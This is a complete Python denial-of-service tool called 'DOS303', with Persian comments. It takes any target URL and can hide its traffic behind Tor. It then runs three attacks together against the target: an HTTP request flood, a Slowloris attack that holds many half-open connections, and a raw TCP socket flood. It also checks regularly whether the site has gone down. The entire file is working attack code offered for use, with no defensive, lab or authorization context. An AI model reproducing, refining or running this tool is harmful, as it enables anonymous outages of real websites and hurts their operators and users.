#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DOS303 - Ultimate Attack System v3.0
"""

import os
import sys
import time
import random
import asyncio
import subprocess
import platform
import socket
import ssl
import aiohttp
from aiohttp_socks import ProxyConnector
import psutil
from urllib.parse import urlparse

# ============================================
# 🎯 BANNER
# ============================================

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[92m")
    print("""
╔══════════════════════════════════════════╗
║               DOS303 v1.0                ║
║       Telegram: @iazmonman               ║
╚══════════════════════════════════════════╝
\033[0m
""")

# ============================================
# ⚙️ AUTO INSTALLER
# ============================================

def auto_install():
    """نصب خودکار"""
    packages = ['aiohttp', 'aiohttp-socks', 'psutil']
    
    for pkg in packages:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"], 
                         capture_output=True)

# ============================================
# 🕶️ TOR MANAGER - OPTIMIZED
# ============================================

class TorManager:
    """مدیریت Tor ساده"""
    
    def __init__(self):
        self.tor_proxy = "socks5://127.0.0.1:9050"
        self.tor_process = None
        self.session = None
    
    async def setup(self):
        """راه‌اندازی سریع Tor"""
        print("\033[93m🕶️ Checking Tor...\033[0m")
        
        # فقط اگر Tor نصب بود
        tor_path = self._find_tor()
        if not tor_path:
            print("\033[91m❌ Tor not found (using direct)\033[0m")
            return False
        
        try:
            # اجرای Tor
            if platform.system() == "Windows":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                self.tor_process = subprocess.Popen(
                    [tor_path, "--quiet"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                self.tor_process = subprocess.Popen(
                    [tor_path, "--quiet"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            
            # منتظر Tor (کوتاه‌تر)
            for i in range(10):
                if await self._check_tor():
                    print(f"\033[92m✅ Tor ready ({i+1}s)\033[0m")
                    
                    # ساخت session
                    connector = ProxyConnector.from_url(
                        self.tor_proxy,
                        ssl=False,
                        verify_ssl=False
                    )
                    self.session = aiohttp.ClientSession(connector=connector)
                    return True
                await asyncio.sleep(1)
            
            print("\033[91m❌ Tor timeout (using direct)\033[0m")
            return False
            
        except Exception:
            print("\033[91m❌ Tor error (using direct)\033[0m")
            return False
    
    def _find_tor(self):
        """پیدا کردن Tor"""
        if platform.system() == "Windows":
            paths = [
                r"C:\Users\Public\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe",
                r"C:\Program Files\Tor\tor.exe"
            ]
            for path in paths:
                if os.path.exists(path):
                    return path
        return None
    
    async def _check_tor(self):
        """چک Tor"""
        try:
            connector = ProxyConnector.from_url(self.tor_proxy, ssl=False, verify_ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get("http://check.torproject.org/", ssl=False, timeout=3) as resp:
                    text = await resp.text()
                    return "Congratulations" in text
        except:
            return False

# ============================================
# ⚡ SYSTEM ANALYZER
# ============================================

class SystemAnalyzer:
    """آنالیز سیستم"""
    
    def __init__(self):
        self.level_names = {
            1: "ذغالی 🤡",
            2: "ضعیف 🥱", 
            3: "بد 😴",
            4: "معمولی 😐",
            5: "خوب 👍",
            6: "قوی 💪",
            7: "الترا قوی ⚡"
        }
    
    def analyze(self):
        """آنالیز سریع"""
        print("\033[93m⚡ Analyzing system...\033[0m")
        
        try:
            cpu_cores = psutil.cpu_count(logical=True)
            ram_gb = psutil.virtual_memory().total / (1024**3)
            
            # محاسبه امتیاز
            cpu_score = min(100, cpu_cores * 12)
            ram_score = min(100, ram_gb * 10)
            total_score = (cpu_score * 0.6) + (ram_score * 0.4)
            
            # تعیین سطح
            level = self._get_level(total_score)
            
            return {
                'level': level,
                'level_name': self.level_names[level],
                'cpu_cores': cpu_cores,
                'ram_gb': round(ram_gb, 1),
                'workers': self._get_workers(level, cpu_cores),
                'connections': self._get_connections(level),
                'packet_rate': self._get_packet_rate(level)
            }
        except:
            return {
                'level': 4,
                'level_name': "معمولی 😐",
                'workers': 200,
                'connections': 400,
                'packet_rate': 2000
            }
    
    def _get_level(self, score):
        if score >= 85: return 7
        elif score >= 75: return 6
        elif score >= 65: return 5
        elif score >= 55: return 4
        elif score >= 45: return 3
        elif score >= 35: return 2
        else: return 1
    
    def _get_workers(self, level, cpu_cores):
        base = [25, 50, 100, 200, 400, 800, 1600][level-1]
        return min(1000, base * max(1, cpu_cores // 2))
    
    def _get_connections(self, level):
        return [100, 200, 400, 800, 1600, 3200, 5000][level-1]
    
    def _get_packet_rate(self, level):
        return [500, 1000, 2000, 4000, 8000, 16000, 32000][level-1]

# ============================================
# ⚔️ ATTACK MODULES - BUG FIXED
# ============================================

class HTTPFloodAttack:
    """حمله HTTP Flood"""
    
    def __init__(self, target_url, session, workers):
        self.target_url = target_url
        self.session = session
        self.workers = min(workers, 800)
        self.requests_sent = 0
        
        # آماده‌سازی URLها
        self.urls = self._prepare_urls()
    
    def _prepare_urls(self):
        """آماده‌سازی لیست URL"""
        base = self.target_url.rstrip('/')
        return [
            base,
            f"{base}/",
            f"{base}/index.php",
            f"{base}/index.html",
            f"{base}/?{random.randint(1, 1000000)}"
        ]
    
    async def attack(self):
        """شروع حمله"""
        print(f"\033[92m✅ HTTP Flood - {self.workers} workers\033[0m")
        
        tasks = []
        for i in range(self.workers):
            task = asyncio.create_task(self._worker())
            tasks.append(task)
            if i % 100 == 0:
                await asyncio.sleep(0.01)
        
        monitor_task = asyncio.create_task(self._monitor())
        tasks.append(monitor_task)
        
        try:
            await asyncio.gather(*tasks)
        except:
            pass
    
    async def _worker(self):
        """کارگر حمله"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'curl/7.68.0'
        ]
        
        while True:
            try:
                url = random.choice(self.urls)
                headers = {'User-Agent': random.choice(user_agents)}
                
                async with self.session.get(url, headers=headers, ssl=False, timeout=2) as response:
                    await response.read()
                    self.requests_sent += 1
                
                await asyncio.sleep(0.001)
                
            except asyncio.TimeoutError:
                self.requests_sent += 1  # Timeout = موفقیت
                await asyncio.sleep(0.01)
            except:
                await asyncio.sleep(0.05)
    
    async def _monitor(self):
        """مانیتورینگ"""
        last_count = 0
        while True:
            await asyncio.sleep(5)
            current = self.requests_sent
            diff = current - last_count
            rps = diff / 5
            
            if diff > 0:
                print(f"\033[94m   📊 HTTP: {current:,} (+{diff}) | {rps:.1f}/sec\033[0m")
            
            last_count = current

class SlowlorisAttack:
    """حمله Slowloris - باگ رفع شده"""
    
    def __init__(self, host, port, connections):
        self.host = host
        self.port = port
        self.max_connections = min(connections, 1000)
        self.active_connections = 0
        self.total_created = 0
        
        # برای جلوگیری از شمارش منفی
        self._lock = asyncio.Lock()
    
    async def attack(self):
        """شروع حمله"""
        print(f"\033[92m✅ Slowloris - {self.max_connections} connections\033[0m")
        
        # ایجاد اتصالات اولیه
        initial = min(200, self.max_connections)
        for i in range(initial):
            asyncio.create_task(self._create_connection())
            await asyncio.sleep(0.05)
        
        # مانیتور و مدیریت اتصالات
        while True:
            await asyncio.sleep(10)
            
            # نمایش آمار
            print(f"\033[94m   📊 Slowloris: {self.active_connections} active | {self.total_created} total\033[0m")
            
            # ایجاد اتصالات جدید اگر کم شده
            async with self._lock:
                if self.active_connections < self.max_connections * 0.6:
                    needed = self.max_connections - self.active_connections
                    for i in range(min(needed, 100)):
                        asyncio.create_task(self._create_connection())
                        if i % 20 == 0:
                            await asyncio.sleep(0.05)
    
    async def _create_connection(self):
        """ایجاد اتصال - با شمارش صحیح"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))
            
            # افزایش شمارش با lock
            async with self._lock:
                self.active_connections += 1
                self.total_created += 1
            
            # ارسال درخواست ناقص
            request = f"GET / HTTP/1.1\r\nHost: {self.host}\r\n"
            request += f"Content-Length: {random.randint(1000000, 10000000)}\r\n\r\n"
            
            sock.send(request.encode())
            
            # نگه‌داری اتصال
            while True:
                try:
                    sock.send(f"X-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n".encode())
                    await asyncio.sleep(random.uniform(15, 45))
                except:
                    break
            
            sock.close()
            
        except Exception as e:
            # خطا - کاهش شمارش
            pass
        finally:
            # کاهش شمارش با lock - مهم: جلوگیری از منفی شدن
            async with self._lock:
                if self.active_connections > 0:
                    self.active_connections -= 1

class SocketFloodAttack:
    """حمله Socket Flood"""
    
    def __init__(self, host, port, packet_rate):
        self.host = host
        self.port = port
        self.packet_rate = min(packet_rate, 10000)
        self.packets_sent = 0
    
    async def attack(self):
        """شروع حمله"""
        print(f"\033[92m✅ Socket Flood - {self.packet_rate}/sec\033[0m")
        
        workers = min(100, self.packet_rate // 100)
        tasks = []
        
        for i in range(workers):
            task = asyncio.create_task(self._worker())
            tasks.append(task)
        
        monitor_task = asyncio.create_task(self._monitor())
        tasks.append(monitor_task)
        
        try:
            await asyncio.gather(*tasks)
        except:
            pass
    
    async def _worker(self):
        """کارگر Flood"""
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.host, self.port))
                
                for _ in range(10):
                    try:
                        sock.send(b'X' * 512)
                        self.packets_sent += 1
                        await asyncio.sleep(0.001)
                    except:
                        break
                
                sock.close()
                await asyncio.sleep(0.01)
                
            except:
                await asyncio.sleep(0.1)
    
    async def _monitor(self):
        """مانیتورینگ"""
        while True:
            await asyncio.sleep(5)
            print(f"\033[94m   📊 Socket: {self.packets_sent:,} packets\033[0m")

# ============================================
# 🎯 MAIN CONTROLLER
# ============================================

class DOS303Controller:
    """کنترلر اصلی"""
    
    def __init__(self):
        self.start_time = 0
        self.attacks = []
    
    async def start(self):
        """شروع سیستم"""
        try:
            # 1. نمایش بنر
            show_banner()
            
            # 2. نصب خودکار
            auto_install()
            
            # 3. دریافت هدف
            target = self._get_target()
            if not target:
                return
            
            print(f"\033[96m🎯 Target: {target}\033[0m")
            print("\033[94m" + "="*50 + "\033[0m")
            
            # 4. پارس URL
            parsed = urlparse(target)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            print(f"\033[93m🔍 Target: {host}:{port}\033[0m")
            
            # 5. راه‌اندازی Tor
            tor = TorManager()
            tor_ok = await tor.setup()
            
            if tor_ok:
                session = tor.session
                print("\033[92m✅ Tor active\033[0m")
            else:
                connector = aiohttp.TCPConnector(ssl=False)
                session = aiohttp.ClientSession(connector=connector)
                print("\033[93m⚠️ Using direct connection\033[0m")
            
            # 6. آنالیز سیستم
            analyzer = SystemAnalyzer()
            capacity = analyzer.analyze()
            
            print(f"   🎯 Level: {capacity['level']} - {capacity['level_name']}")
            print(f"   👥 Workers: {capacity['workers']:,}")
            print(f"   🔗 Connections: {capacity['connections']:,}")
            print(f"   📦 Packet rate: {capacity['packet_rate']:,}/sec")
            
            # 7. شروع حملات
            print("\n" + "="*50)
            print("\033[92m⚔️ STARTING ATTACKS\033[0m")
            print("="*50 + "\n")
            
            http_attack = HTTPFloodAttack(target, session, capacity['workers'])
            slowloris_attack = SlowlorisAttack(host, port, capacity['connections'])
            socket_attack = SocketFloodAttack(host, port, capacity['packet_rate'])
            
            self.attacks = [http_attack, slowloris_attack, socket_attack]
            self.start_time = time.time()
            
            # شروع همه حملات
            tasks = [
                asyncio.create_task(http_attack.attack()),
                asyncio.create_task(slowloris_attack.attack()),
                asyncio.create_task(socket_attack.attack()),
                asyncio.create_task(self._global_monitor())
            ]
            
            print("\033[92m✅ All attacks started!\033[0m")
            print("\033[93m⏰ Running... (Ctrl+C to stop)\033[0m")
            print("\033[91m" + "="*50 + "\033[0m\n")
            
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except KeyboardInterrupt:
            print("\n\033[93m⚠️ Attack stopped\033[0m")
        except Exception as e:
            print(f"\n\033[91m💥 Error: {str(e)[:60]}\033[0m")
        finally:
            print("\n\033[92m👋 DOS303 finished\033[0m")
    
    def _get_target(self):
        """دریافت هدف"""
        if len(sys.argv) > 1:
            target = sys.argv[1]
        else:
            target = input("\033[96mEnter target URL: \033[0m").strip()
        
        if not target:
            print("\033[91m❌ No target\033[0m")
            return None
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        return target
    
    async def _global_monitor(self):
        """مانیتورینگ کلی"""
        iteration = 0
        
        while True:
            await asyncio.sleep(10)
            iteration += 1
            
            elapsed = time.time() - self.start_time
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)
            
            print("\n" + "="*50)
            print(f"\033[96m📊 ATTACK STATS - Round {iteration}\033[0m")
            print(f"\033[93m⏱️  Time: {hours:02d}:{minutes:02d}:{seconds:02d}\033[0m")
            
            if len(self.attacks) >= 3:
                http = self.attacks[0]
                slowloris = self.attacks[1]
                socket_flood = self.attacks[2]
                
                print(f"\033[92m✅ HTTP Requests: {http.requests_sent:,}\033[0m")
                print(f"\033[92m✅ Slowloris Active: {slowloris.active_connections:,}\033[0m")
                print(f"\033[92m✅ Socket Packets: {socket_flood.packets_sent:,}\033[0m")
                
                total = http.requests_sent + socket_flood.packets_sent
                rate = total / elapsed if elapsed > 0 else 0
                print(f"\033[94m📈 Total: {total:,} | Rate: {rate:.1f}/sec\033[0m")
            
            # چک سایت هر 30 ثانیه
            if iteration % 3 == 0 and len(self.attacks) > 0:
                await self._check_site(self.attacks[0].target_url)
    
    async def _check_site(self, url):
        """چک وضعیت سایت"""
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                try:
                    async with session.get(url, ssl=False, timeout=5) as response:
                        if response.status >= 500:
                            print(f"\033[91m❌ Site may be DOWN (HTTP {response.status})\033[0m")
                        elif response.status >= 400:
                            print(f"\033[93m⚠️  Site error (HTTP {response.status})\033[0m")
                        else:
                            print(f"\033[92m✅ Site responding (HTTP {response.status})\033[0m")
                except asyncio.TimeoutError:
                    print(f"\033[91m❌ Site timeout\033[0m")
                except:
                    print(f"\033[91m❌ Site unreachable\033[0m")
        except:
            pass

# ============================================
# 🚀 MAIN
# ============================================

async def main():
    controller = DOS303Controller()
    await controller.start()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\033[93m⚠️ Exiting...\033[0m")
    except Exception as e:
        print(f"\n\033[91m💥 Fatal: {e}\033[0m")